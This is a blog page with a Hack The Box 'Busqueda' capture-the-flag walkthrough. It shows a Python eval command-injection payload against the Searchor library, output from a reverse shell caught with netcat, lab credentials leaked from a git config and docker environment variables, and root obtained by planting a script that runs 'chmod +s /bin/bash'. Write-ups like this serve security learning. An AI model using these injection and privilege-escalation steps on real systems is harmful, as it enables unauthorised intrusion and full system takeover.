<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self' https://www.dropbox.com https://*.dl.dropboxusercontent.com https://photos.app.goo.gl https://drive.google.com https://photos.google.com https://video-downloads.googleusercontent.com https://*.googleusercontent.com https://*.googlevideo.com https://youtube.googleapis.com; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' https://w.soundcloud.com https://www.youtube.com https://www.youtube-nocookie.com https://www.dropbox.com http://localhost https://www.dropbox.com http://darvein.local https://disqus.com; img-src 'self' https://photos.google.com https://lh3.googleusercontent.com https://www.dropbox.com https://*.dl.dropboxusercontent.com https://*.disqus.com https://c.disquscdn.com; object-src https://lh3.googleusercontent.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/ https://c.disquscdn.com; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdnjs.cloudflare.com https://www.googletagmanager.com https://www.dropbox.com http://localhost http://darvein.local https://drv21.disqus.com https://c.disquscdn.com; prefetch-src 'self' https://youtube.googleapis.com; connect-src 'self' https://www.google-analytics.com https://links.services.disqus.com;"><meta name=author content="Dennis Ruiz"><meta name=description content="easy - Busqueda User flag Yeah!, let&rsquo;s start with this easy one.
A simple curl tells us something, alright, let&rsquo;s upate the /etc/hosts
~f➤ curl -I busqueda.htb HTTP/1.1 302 Found Date: Thu, 15 Jun 2023 00:53:57 GMT Server: Apache/2.4.52 (Ubuntu) Location: http://searcher.htb/ Content-Type: text/html; charset=iso-8859-1 Now we&rsquo;ve got something: &#8213; Searcher web page &#8213; A quick look to the HTML source code shows that it uses Flask and uses ArjunSharda/Searchor app:"><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="easy - Busqueda User flag Yeah!, let&rsquo;s start with this easy one.
A simple curl tells us something, alright, let&rsquo;s upate the /etc/hosts
~f➤ curl -I busqueda.htb HTTP/1.1 302 Found Date: Thu, 15 Jun 2023 00:53:57 GMT Server: Apache/2.4.52 (Ubuntu) Location: http://searcher.htb/ Content-Type: text/html; charset=iso-8859-1 Now we&rsquo;ve got something: &#8213; Searcher web page &#8213; A quick look to the HTML source code shows that it uses Flask and uses ArjunSharda/Searchor app:"><meta property="og:title" content><meta property="og:description" content="easy - Busqueda User flag Yeah!, let&rsquo;s start with this easy one.
A simple curl tells us something, alright, let&rsquo;s upate the /etc/hosts
~f➤ curl -I busqueda.htb HTTP/1.1 302 Found Date: Thu, 15 Jun 2023 00:53:57 GMT Server: Apache/2.4.52 (Ubuntu) Location: http://searcher.htb/ Content-Type: text/html; charset=iso-8859-1 Now we&rsquo;ve got something: &#8213; Searcher web page &#8213; A quick look to the HTML source code shows that it uses Flask and uses ArjunSharda/Searchor app:"><meta property="og:type" content="article"><meta property="og:url" content="https://www.darvein.net/infosec/htb/machines/easy/busqueda/"><meta property="article:section" content="infosec"><title>easy - Busqueda </title><link rel=canonical href=https://www.darvein.net/infosec/htb/machines/easy/busqueda/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a1a7e7e7bd8b6629931805334fd6cf056ee6f154702847e6d597bbfe80446a0d.css integrity="sha256-oafn572LZimTGAUzT9bPBW7m8VRwKEfm1Ze7/oBEag0=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.7cf8a329bb485491ed5be45bd286916c655bf66e11e3fe4d82649437eae8b51b.css integrity="sha256-fPijKbtIVJHtW+Rb0oaRbGVb9m4R4/5NgmSUN+rotRs=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Darvein
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/infosec/>Infosec</a></li><li class=navigation-item><a class=navigation-link href=/coding/>Coding</a></li><li class=navigation-item><a class=navigation-link href=/devops/>Devops</a></li></ul></section></nav><div class=content><section class="container page"><article><h1 id=easy---busqueda>easy - Busqueda
<a class=heading-link href=#easy---busqueda><i class="fa fa-link" aria-hidden=true></i></a></h1><h2 id=user-flag>User flag
<a class=heading-link href=#user-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>Yeah!, let&rsquo;s start with this easy one.</p><p>A simple curl tells us something, alright, let&rsquo;s upate the /etc/hosts</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~f➤ curl -I busqueda.htb
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#0086f7;font-weight:700>302</span> Found
</span></span><span style=display:flex><span>Date: Thu, <span style=color:#0086f7;font-weight:700>15</span> Jun <span style=color:#0086f7;font-weight:700>2023</span> 00:53:57 GMT
</span></span><span style=display:flex><span>Server: Apache/2.4.52 (Ubuntu)
</span></span><span style=display:flex><span>Location: http://searcher.htb/
</span></span><span style=display:flex><span>Content-Type: text/html; <span style=color:#fb660a>charset</span>=iso-8859-1
</span></span></code></pre></div><p>Now we&rsquo;ve got something:<figure class=image-container><a href=/i/2023-06-14_20-54.png><img width=100% src=/i/2023-06-14_20-54.png alt="Searcher web page"></a><figcaption>&#8213; Searcher web page &#8213;</figcaption></figure></p><p>A quick look to the HTML source code shows that it uses Flask and uses ArjunSharda/Searchor app:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~f➤ curl -s searcher.htb | xurls | ag <span style=color:#0086d2>&#39;flask|github&#39;</span>
</span></span><span style=display:flex><span>https://flask.palletsprojects.com
</span></span><span style=display:flex><span>https://github.com/ArjunSharda/Searchor
</span></span></code></pre></div><p>Also I quickly scanned the machine:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~f➤ sudo nmap -n -Pn -sV -O -T4 searcher.htb
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.52
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>So I&rsquo;ve mentioned we had a Git repo for it, well we have there the Exploit PoC for a Reverse Shell and the main app repo too:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~➤ gh search repos Searchor
</span></span><span style=display:flex><span>Showing <span style=color:#0086f7;font-weight:700>30</span> of <span style=color:#0086f7;font-weight:700>327945</span> repositories
</span></span><span style=display:flex><span>NAME                               DESCRIPTION...
</span></span><span style=display:flex><span>ArjunSharda/Searchor               ⚡️ Quick and easy searching tasks in one library...
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection            Reverse Shell Exploit <span style=color:#fb660a;font-weight:700>for</span> Searchor &lt;= 2.4.2 (2.4.0)
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>So the Vuln is simple, that app once the user inputs a text string to search something it executes a python <code>eval</code> function without propery escaping unintended inputs.</p><p>If we inject this we will see our command gets executed: <code>',__import__('os').system('find . -type f')) #</code></p><figure class=image-container><a href=/i/2023-06-14_21-27.png><img width=100% src=/i/2023-06-14_21-27.png alt=Injection></a><figcaption>&#8213; Injection &#8213;</figcaption></figure><p>So we just run the script kiddie script and voilá:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>➤ nc -lvnp <span style=color:#0086f7;font-weight:700>55555</span>
</span></span><span style=display:flex><span>Connection from 10.10.11.208:55494
</span></span><span style=display:flex><span>bash: cannot set terminal process group (1640): Inappropriate ioctl <span style=color:#fb660a;font-weight:700>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>svc@busqueda:/var/www/app$ id
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1000(svc) <span style=color:#fb660a>gid</span>=1000(svc) <span style=color:#fb660a>groups</span>=1000(svc)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>svc@busqueda:~$ ls <span style=color:#fb660a>$PWD</span>
</span></span><span style=display:flex><span>ls <span style=color:#fb660a>$PWD</span>
</span></span><span style=display:flex><span>user.txt
</span></span></code></pre></div><p>HTB is not cool anymore :/</p><h2 id=root-flag>Root flag
<a class=heading-link href=#root-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>I&rsquo;ve tried to check git commits, branches, tags, there is nothing. Except for this:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>svc@busqueda:/var/www/app$ cat .git/config | grep url
</span></span><span style=display:flex><span>cat .git/config | grep url
</span></span><span style=display:flex><span>        <span style=color:#fb660a>url</span> = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
</span></span></code></pre></div><p>So we have user and password for that HTTP website, Gitea.</p><figure class=image-container><a href=/i/2023-06-14_21-46.png><img width=100% src=/i/2023-06-14_21-46.png alt=Gitea></a><figcaption>&#8213; Gitea &#8213;</figcaption></figure><p>Nothing interesting is found in the Git tea web app, but we have something in <code>sudo</code> (svc user ssh password is the same as cody http password)</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>svc@busqueda:~$ sudo -l
</span></span><span style=display:flex><span>[sudo] password <span style=color:#fb660a;font-weight:700>for</span> svc:
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#fb660a;font-weight:700>for</span> svc on busqueda:
</span></span><span style=display:flex><span>    env_reset, mail_badpass, <span style=color:#fb660a>secure_path</span>=/usr/local/sbin<span style=color:#0086d2>\:</span>/usr/local/bin<span style=color:#0086d2>\:</span>/usr/sbin<span style=color:#0086d2>\:</span>/usr/bin<span style=color:#0086d2>\:</span>/sbin<span style=color:#0086d2>\:</span>/bin<span style=color:#0086d2>\:</span>/snap/bin, use_pty
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User svc may run the following commands on busqueda:
</span></span><span style=display:flex><span>    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
</span></span></code></pre></div><p>Ok, that py script does something, also that <code>use_pty</code> might be something for us to exploit:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
</span></span><span style=display:flex><span>Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>     docker-ps     : List running docker containers
</span></span><span style=display:flex><span>     docker-inspect : Inpect a certain docker container
</span></span><span style=display:flex><span>     full-checkup  : Run a full system checkup
</span></span></code></pre></div><p>I&rsquo;ve trying that script, turns out that it allow us to interact with docker engine.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
</span></span><span style=display:flex><span>CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS             PORTS                                             NAMES
</span></span><span style=display:flex><span>960873171e2e   gitea/gitea:latest   <span style=color:#0086d2>&#34;/usr/bin/entrypoint…&#34;</span>   <span style=color:#0086f7;font-weight:700>5</span> months ago   Up About an hour   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   gitea
</span></span><span style=display:flex><span>f84a6b33fb5a   mysql:8              <span style=color:#0086d2>&#34;docker-entrypoint.s…&#34;</span>   <span style=color:#0086f7;font-weight:700>5</span> months ago   Up About an hour   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_db
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect <span style=color:#0086d2>&#39;{{json .Config.Env}}&#39;</span> mysql_db
</span></span><span style=display:flex><span>[<span style=color:#0086d2>&#34;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&#34;</span>,<span style=color:#0086d2>&#34;MYSQL_USER=gitea&#34;</span>,<span style=color:#0086d2>&#34;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh&#34;</span>,<span style=color:#0086d2>&#34;MYSQL_DATABASE=gitea&#34;</span>,<span style=color:#0086d2>&#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>,<span style=color:#0086d2>&#34;GOSU_VERSION=1.14&#34;</span>,<span style=color:#0086d2>&#34;MYSQL_MAJOR=8.0&#34;</span>,<span style=color:#0086d2>&#34;MYSQL_VERSION=8.0.31-1.el8&#34;</span>,<span style=color:#0086d2>&#34;MYSQL_SHELL_VERSION=8.0.31-1.el8&#34;</span>]
</span></span></code></pre></div><p>I wasn&rsquo;t able to SSH or access Mysql with those credentials, but I was able to login into Gitea as administrator.</p><figure class=image-container><a href=/i/2023-06-14_22-03.png><img width=100% src=/i/2023-06-14_22-03.png alt="Gitea admin"></a><figcaption>&#8213; Gitea admin &#8213;</figcaption></figure><p>So, I reviewed this file:
<a href=http://gitea.searcher.htb/administrator/scripts/src/branch/main/system-checkup.py>http://gitea.searcher.htb/administrator/scripts/src/branch/main/system-checkup.py</a></p><p>Which is basically running a shell script from a relative path:</p><figure class=image-container><a href=/i/2023-06-14_22-19.png><img width=100% src=/i/2023-06-14_22-19.png alt="bug in the code"></a><figcaption>&#8213; bug in the code &#8213;</figcaption></figure><p>So all what is needed is just to create a fake full-checkup.sh and make /bin/bash setuid.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>svc@busqueda:~$ cat full-checkup.sh
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>#!/bin/bash</span>
</span></span><span style=display:flex><span>chmod +s /bin/bash
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[+] Done!
</span></span><span style=display:flex><span>svc@busqueda:~$ /bin/bash -p
</span></span><span style=display:flex><span>bash-5.1# id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1000(svc) <span style=color:#fb660a>gid</span>=1000(svc) <span style=color:#fb660a>euid</span>=0(root) <span style=color:#fb660a>egid</span>=0(root) <span style=color:#fb660a>groups</span>=0(root),1000(svc)
</span></span></code></pre></div></article></section></div><footer class=footer><section class=container>©
2021 -
2024
Dennis Ruiz
·
Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-6CQZY8W0WD"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6CQZY8W0WD")</script><script>$(document).on("input propertychange paste change",".FilterSearch",function(){var n=$(this).val().toLowerCase(),s=$(this).closest("ul"),t=s.find("li:gt(0)");t.hide(),t.filter(function(){var e=$(this).text().toLowerCase();return e.indexOf(n)>=0}).show()})</script></body></html>